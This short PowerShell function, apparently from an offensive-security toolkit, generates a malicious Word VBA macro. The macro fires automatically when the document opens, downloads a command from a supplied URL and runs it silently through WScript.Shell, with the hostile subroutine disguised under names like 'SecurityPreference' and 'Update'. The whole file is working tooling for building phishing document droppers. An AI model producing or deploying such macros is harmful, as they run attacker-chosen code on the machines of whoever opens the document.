function Build-Macro ([string]$PayloadURL) {
# AUTHOR: Tyler McCann (@tylerdotrar)
# ARBITRARY VERSION NUMBER: 1.0.0
    
    # Error Correction
    if (!$PayloadURL)                 { return (Write-Host 'Template URL not input.' -ForegroundColor Red) }
    if ($PayloadURL -notlike "http*") { return (Write-Host 'Template URL not in correct format.' -ForegroundColor Red) }

    # Supports HTTPS URLs with Self-Signed Certificates
    $Macro = @"
Private Sub AutoOpen()
        SecurityPreference
End Sub

Private Sub Document_Open()
        SecurityPreference
End Sub

Private Sub SecurityPreference()
        Set Request = CreateObject("MSXML2.ServerXMLHTTP")
        Request.SetOption 2, Request.GetOption(2)
        Request.Open "GET", "$PayloadURL", False
        Request.Send
        Dim Security As String
        Security = Request.ResponseText
        Set Update = CreateObject("WScript.Shell")
        Update.Run (Security), 0
        Set Update = Nothing
End Sub
"@

    return $Macro
}